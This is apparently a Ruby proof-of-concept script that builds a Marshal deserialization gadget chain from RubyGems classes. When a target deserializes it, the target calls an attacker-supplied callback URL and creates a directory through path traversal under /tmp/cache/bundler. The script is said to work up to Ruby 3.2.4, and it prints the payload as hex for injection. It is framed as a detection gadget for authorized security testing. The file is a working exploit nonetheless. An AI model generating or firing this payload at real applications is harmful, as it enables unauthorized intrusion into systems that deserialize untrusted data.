# Disclaimer:
# This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, 
# and is not intended to be used to attack systems except where explicitly authorized.
# Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

# This Ruby marshall unsafe deserialization proof of concept is originally based on: https://devcraft.io/2022/04/04/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
# It was observed to work up to Ruby 3.2.4

Gem::SpecFetcher # Autoload 


def call_url_and_create_folder(url) # provided url should not have a query (?) component
  uri = URI::HTTP.allocate
  uri.instance_variable_set("@path", "/")
  uri.instance_variable_set("@scheme", "s3")
  uri.instance_variable_set("@host", url + "?")  # use the https host+path with your rz file
  uri.instance_variable_set("@port", "/../../../../../../../../../../../../../../../tmp/cache/bundler/git/any-c5fe0200d1c7a5139bd18fd22268c4ca8bf45e90/") # c5fe... is the SHA-1 of "any"
  uri.instance_variable_set("@user", "any")
  uri.instance_variable_set("@password", "any")

  source = Gem::Source.allocate
  source.instance_variable_set("@uri", uri)
  source.instance_variable_set("@update_cache", true)

  index_spec = Gem::Resolver::IndexSpecification.allocate
  index_spec.instance_variable_set("@name", "name")
  index_spec.instance_variable_set("@source", source)

  request_set = Gem::RequestSet.allocate
  request_set.instance_variable_set("@sorted_requests", [index_spec])

  lockfile = Gem::RequestSet::Lockfile.allocate
  lockfile.instance_variable_set("@set", request_set)
  lockfile.instance_variable_set("@dependencies", [])

  return lockfile
end

def to_s_wrapper(inner)
  spec = Gem::Specification.new
  spec.instance_variable_set("@new_platform", inner)
  return spec
end

def create_detection_gadget_chain(url)
  call_url_gadget = call_url_and_create_folder(url)

  return Marshal.dump([Gem::SpecFetcher, to_s_wrapper(call_url_gadget)])
end

url = "{CALLBACK_DOMAIN}" # replace with URL to call in the detection gadget, for example: test.example.org/path, url should not have a query (?) component.
detection_gadget_chain = create_detection_gadget_chain(url)

#puts "Detection gadget chain using callback URL #{url}:"
puts detection_gadget_chain.unpack("H*")

#Marshal.load(detection_gadget_chain) # caution: will trigger the detection gadget when uncommented.
